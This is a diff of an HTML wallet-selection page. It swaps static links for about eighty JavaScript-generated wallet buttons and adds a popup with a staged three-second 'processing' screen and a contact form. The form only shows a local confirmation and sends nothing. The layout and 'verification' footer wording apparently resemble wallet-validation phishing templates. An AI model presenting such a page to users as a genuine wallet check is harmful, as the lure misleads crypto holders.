-                        <span class="wallet-name">IOST</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/2523/small/IOST.png" alt="IOST" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Qtum</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/684/small/qtum.png" alt="Qtum" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Waves</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/425/small/waves.png" alt="Waves" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Algorand</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/4380/small/download.png" alt="Algorand" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Zcash</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/486/small/circle-zcash-color.png" alt="Zcash" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Vechain</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/1167/small/VET_Token_Icon.png" alt="Vechain" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Stellar</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/100/small/Stellar_symbol_black_RGB.png" alt="Stellar" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Tron</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/1094/small/tron-logo.png" alt="Tron" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Terra</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/8284/small/luna150.png" alt="Terra" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Cosmos</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png" alt="Cosmos" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Metis</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/15595/small/metis.png" alt="Metis" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Optimism</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/25244/small/Optimism.png" alt="Optimism" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Injective</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/12882/small/Secondary_Symbol.png" alt="Injective" class="wallet-logo">
-                </a>
+                <!-- Wallets are automatically generated here -->
 
             </div>
+
         </div>
+
     </div>
 
 </section>
 
 
-<footer class="footer">
 
+<!-- =====================================================
+     POPUP
+===================================================== -->
+
+<div
+    class="popup-overlay"
+    id="popupOverlay"
+>
+
+    <div
+        class="popup"
+        id="popup"
+    >
+
+        <button
+            class="close-popup"
+            onclick="closePopup()"
+            aria-label="Close"
+        >
+            ×
+        </button>
+
+
+        <!-- PROCESSING -->
+
+        <div
+            class="processing-screen"
+            id="processingScreen"
+        >
+
+            <div class="processing-icon"></div>
+
+            <h2 class="processing-title">
+                Processing...
+            </h2>
+
+            <p class="processing-text">
+                Please wait while we process your
+                wallet selection.
+            </p>
+
+        </div>
+
+
+
+        <!-- SUCCESS -->
+
+        <div
+            class="success-screen"
+            id="successScreen"
+        >
+
+            <img
+                id="selectedWalletLogo"
+                class="selected-wallet-logo"
+                src=""
+                alt="Selected wallet"
+            >
+
+
+            <h2 class="success-title">
+
+                Thank you for choosing
+                <span id="selectedWalletName">
+                </span>
+
+            </h2>
+
+
+            <p class="success-text">
+
+                Your wallet selection has been
+                received. You can leave your
+                contact information below.
+
+            </p>
+
+
+            <!-- SAFE FORM -->
+
+            <form
+                class="wallet-form"
+                id="walletForm"
+                onsubmit="submitForm(event)"
+            >
+
+                <label
+                    class="form-label"
+                    for="email"
+                >
+                    Email address
+                </label>
+
+                <input
+                    type="email"
+                    id="email"
+                    class="form-input"
+                    placeholder="Enter your email"
+                    required
+                >
+
+
+                <label
+                    class="form-label"
+                    for="message"
+                >
+                    Message
+                </label>
+
+                <textarea
+                    id="message"
+                    class="form-textarea"
+                    placeholder="Enter your message"
+                    required
+                ></textarea>
+
+
+                <button
+                    type="submit"
+                    class="submit-button"
+                >
+                    Submit
+                </button>
+
+
+                <div
+                    class="form-message"
+                    id="formMessage"
+                >
+                    Thank you. Your message has been
+                    submitted successfully.
+                </div>
+
+            </form>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+
+<!-- =====================================================
+     FOOTER
+===================================================== -->
+
+<footer class="footer">
 
     <div class="footer-inner">
 
@@ -1113,9 +1191,9 @@ body::before {
             verification and validation purposes and
             handled in accordance with our privacy
             and security policies. We are committed
-            to maintaining the highest standards of
-            confidentiality and protecting your trust
-            every step of the way.
+            to maintaining the highest standards
+            of confidentiality and protecting your
+            trust every step of the way.
         </p>
 
 
@@ -1132,11 +1210,658 @@ body::before {
 
         </p>
 
-
     </div>
 
-
 </footer>
+
+
+
+<script>
+
+/* =====================================================
+   WALLET DATA
+===================================================== */
+
+const wallets = [
+
+    {
+        name: "Metamask",
+        logo: "pictures/metamask.png"
+    },
+
+    {
+        name: "Trust",
+        logo: "pictures/trust.png"
+    },
+
+    {
+        name: "Coinbase",
+        logo: "pictures/Coinbase .png"
+    },
+
+    {
+        name: "Kukai",
+        logo: "pictures/Kukai.png"
+    },
+
+    {
+        name: "Cardano",
+        logo: "https://assets.coingecko.com/coins/images/975/small/cardano.png"
+    },
+
+    {
+        name: "Dero Wallet",
+        logo: "pictures/Derowallet.png"
+    },
+
+    {
+        name: "Yoroi",
+        logo: "pictures/Yoroi.png"
+    },
+
+    {
+        name: "CCVault",
+        logo: "pictures/Ccvault.jpg"
+    },
+
+    {
+        name: "Gero",
+        logo: "pictures/Gero.png"
+    },
+
+    {
+        name: "Nami",
+        logo: "pictures/Nami.png"
+    },
+
+    {
+        name: "Solana",
+        logo: "https://assets.coingecko.com/coins/images/4128/small/solana.png"
+    },
+
+    {
+        name: "Phantom",
+        logo: "pictures/Phantom.jpg"
+    },
+
+    {
+        name: "Solflare",
+        logo: "pictures/solflare.png"
+    },
+
+    {
+        name: "Sollet",
+        logo: "https://assets.coingecko.com/coins/images/4128/small/solana.png"
+    },
+
+    {
+        name: "Solong",
+        logo: "https://assets.coingecko.com/coins/images/4128/small/solana.png"
+    },
+
+    {
+        name: "Exodus",
+        logo: "https://assets.coingecko.com/coins/images/1/small/bitcoin.png"
+    },
+
+    {
+        name: "Avalanche",
+        logo: "https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png"
+    },
+
+    {
+        name: "Velas",
+        logo: "https://assets.coingecko.com/coins/images/9622/small/Velas.png"
+    },
+
+    {
+        name: "crypto.com",
+        logo: "https://assets.coingecko.com/coins/images/7310/small/cronos.png"
+    },
+
+    {
+        name: "Blockchain",
+        logo: "https://assets.coingecko.com/coins/images/1/small/bitcoin.png"
+    },
+
+    {
+        name: "Binance Smart",
+        logo: "https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png"
+    },
+
+    {
+        name: "Safepal",
+        logo: "https://assets.coingecko.com/coins/images/13904/small/SFP.png"
+    },
+
+    {
+        name: "Raydium",
+        logo: "https://assets.coingecko.com/coins/images/13928/small/raydium.png"
+    },
+
+    {
+        name: "Torus",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "MathWallet",
+        logo: "https://assets.coingecko.com/coins/images/10708/small/math.png"
+    },
+
+    {
+        name: "Keyring Pro",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "BitKeep",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "SparkPoint",
+        logo: "https://assets.coingecko.com/coins/images/7928/small/SRK_logo.png"
+    },
+
+    {
+        name: "OwnBit",
+        logo: "https://assets.coingecko.com/coins/images/1/small/bitcoin.png"
+    },
+
+    {
+        name: "Infinity Wallet",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "WalletConnect",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Infinity",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "TokenPocket",
+        logo: "https://assets.coingecko.com/coins/images/11883/small/TP_logo.png"
+    },
+
+    {
+        name: "Nash",
+        logo: "https://assets.coingecko.com/coins/images/8051/small/NEX.png"
+    },
+
+    {
+        name: "BitPay",
+        logo: "https://assets.coingecko.com/coins/images/1/small/bitcoin.png"
+    },
+
+    {
+        name: "imToken",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Peritas",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "ParaSwap",
+        logo: "https://assets.coingecko.com/coins/images/20403/small/psp.png"
+    },
+
+    {
+        name: "Bity",
+        logo: "https://assets.coingecko.com/coins/images/1/small/bitcoin.png"
+    },
+
+    {
+        name: "Defiat",
+        logo: "https://assets.coingecko.com/coins/images/12250/small/DFT.png"
+    },
+
+    {
+        name: "Crossmint",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Zelcore",
+        logo: "https://assets.coingecko.com/coins/images/5039/small/flux.png"
+    },
+
+    {
+        name: "Freespace",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "OneKey",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Ledge",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Tezos",
+        logo: "https://assets.coingecko.com/coins/images/976/small/Tezos-logo-Symbol-PNG.png"
+    },
+
+    {
+        name: "Neobeats",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Dockery",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Paper",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Plair",
+        logo: "https://assets.coingecko.com/coins/images/6835/small/PLA.png"
+    },
+
+    {
+        name: "Proton",
+        logo: "https://assets.coingecko.com/coins/images/11100/small/XPR.png"
+    },
+
+    {
+        name: "Rico",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Betterment",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Strax",
+        logo: "https://assets.coingecko.com/coins/images/533/small/stratis.png"
+    },
+
+    {
+        name: "Sequence",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Tubetomy",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Zelpays",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Vanity",
+        logo: "https://assets.coingecko.com/coins/images/15873/small/Vanity.png"
+    },
+
+    {
+        name: "Verso",
+        logo: "https://assets.coingecko.com/coins/images/15004/small/VSO_Icon_200.png"
+    },
+
+    {
+        name: "Wallet3",
+        logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png"
+    },
+
+    {
+        name: "Polkadot",
+        logo: "https://assets.coingecko.com/coins/images/12171/small/polkadot.png"
+    },
+
+    {
+        name: "Phantasma",
+        logo: "https://assets.coingecko.com/coins/images/4382/small/Phantasma.png"
+    },
+
+    {
+        name: "Filecoin",
+        logo: "https://assets.coingecko.com/coins/images/12817/small/filecoin.png"
+    },
+
+    {
+        name: "IOST",
+        logo: "https://assets.coingecko.com/coins/images/2523/small/IOST.png"
+    },
+
+    {
+        name: "Qtum",
+        logo: "https://assets.coingecko.com/coins/images/684/small/qtum.png"
+    },
+
+    {
+        name: "Waves",
+        logo: "https://assets.coingecko.com/coins/images/425/small/waves.png"
+    },
+
+    {
+        name: "Algorand",
+        logo: "https://assets.coingecko.com/coins/images/4380/small/download.png"
+    },
+
+    {
+        name: "Zcash",
+        logo: "https://assets.coingecko.com/coins/images/486/small/circle-zcash-color.png"
+    },
+
+    {
+        name: "Vechain",
+        logo: "https://assets.coingecko.com/coins/images/1167/small/VET_Token_Icon.png"
+    },
+
+    {
+        name: "Stellar",
+        logo: "https://assets.coingecko.com/coins/images/100/small/Stellar_symbol_black_RGB.png"
+    },
+
+    {
+        name: "Tron",
+        logo: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png"
+    },
+
+    {
+        name: "Terra",
+        logo: "https://assets.coingecko.com/coins/images/8284/small/luna150.png"
+    },
+
+    {
+        name: "Cosmos",
+        logo: "https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png"
+    },
+
+    {
+        name: "Metis",
+        logo: "https://assets.coingecko.com/coins/images/15595/small/metis.png"
+    },
+
+    {
+        name: "Optimism",
+        logo: "https://assets.coingecko.com/coins/images/25244/small/Optimism.png"
+    },
+
+    {
+        name: "Injective",
+        logo: "https://assets.coingecko.com/coins/images/12882/small/Secondary_Symbol.png"
+    }
+
+];
+
+
+/* =====================================================
+   GENERATE WALLETS
+===================================================== */
+
+const walletGrid =
+    document.getElementById("walletGrid");
+
+
+wallets.forEach(function(wallet) {
+
+    const button =
+        document.createElement("button");
+
+    button.className =
+        "wallet-item";
+
+    button.type =
+        "button";
+
+
+    button.innerHTML = `
+
+        <div class="wallet-item-left">
+
+            <span class="wallet-dot"></span>
+
+            <span class="wallet-name">
+                ${wallet.name}
+            </span>
+
+        </div>
+
+        <img
+            src="${wallet.logo}"
+            alt="${wallet.name}"
+            class="wallet-logo"
+        >
+
+    `;
+
+
+    button.addEventListener(
+        "click",
+        function() {
+
+            openWalletPopup(wallet);
+
+        }
+    );
+
+
+    walletGrid.appendChild(button);
+
+});
+
+
+/* =====================================================
+   POPUP ELEMENTS
+===================================================== */
+
+const popupOverlay =
+    document.getElementById(
+        "popupOverlay"
+    );
+
+const processingScreen =
+    document.getElementById(
+        "processingScreen"
+    );
+
+const successScreen =
+    document.getElementById(
+        "successScreen"
+    );
+
+const selectedWalletName =
+    document.getElementById(
+        "selectedWalletName"
+    );
+
+const selectedWalletLogo =
+    document.getElementById(
+        "selectedWalletLogo"
+    );
+
+
+let processingTimer;
+
+
+/* =====================================================
+   OPEN POPUP
+===================================================== */
+
+function openWalletPopup(wallet) {
+
+    clearTimeout(processingTimer);
+
+
+    /*
+       Reset popup
+    */
+
+    processingScreen.style.display =
+        "block";
+
+    successScreen.style.display =
+        "none";
+
+
+    /*
+       Set selected wallet
+    */
+
+    selectedWalletName.textContent =
+        wallet.name;
+
+    selectedWalletLogo.src =
+        wallet.logo;
+
+    selectedWalletLogo.alt =
+        wallet.name;
+
+
+    /*
+       Show popup
+    */
+
+    popupOverlay.classList.add(
+        "active"
+    );
+
+
+    document.body.style.overflow =
+        "hidden";
+
+
+    /*
+       Wait exactly 3 seconds
+    */
+
+    processingTimer =
+        setTimeout(function() {
+
+            processingScreen.style.display =
+                "none";
+
+            successScreen.style.display =
+                "block";
+
+        }, 3000);
+
+}
+
+
+/* =====================================================
+   CLOSE POPUP
+===================================================== */
+
+function closePopup() {
+
+    clearTimeout(processingTimer);
+
+    popupOverlay.classList.remove(
+        "active"
+    );
+
+    document.body.style.overflow =
+        "";
+
+}
+
+
+/* =====================================================
+   CLOSE WHEN CLICKING OUTSIDE
+===================================================== */
+
+popupOverlay.addEventListener(
+    "click",
+    function(event) {
+
+        if (
+            event.target ===
+            popupOverlay
+        ) {
+
+            closePopup();
+
+        }
+
+    }
+);
+
+
+/* =====================================================
+   ESC KEY
+===================================================== */
+
+document.addEventListener(
+    "keydown",
+    function(event) {
+
+        if (
+            event.key === "Escape"
+        ) {
+
+            closePopup();
+
+        }
+
+    }
+);
+
+
+/* =====================================================
+   FORM SUBMISSION
+===================================================== */
+
+function submitForm(event) {
+
+    event.preventDefault();
+
+
+    const formMessage =
+        document.getElementById(
+            "formMessage"
+        );
+
+
+    formMessage.style.display =
+        "block";
+
+
+    /*
+       Disable submit button
+       after submission.
+    */
+
+    const submitButton =
+        event.target.querySelector(
+            ".submit-button"
+        );
+
+
+    submitButton.disabled =
+        true;
+
+    submitButton.style.opacity =
+        "0.6";
+
+    submitButton.textContent =
+        "Submitted";
+
+}
+
+</script>
 
 
 </body>
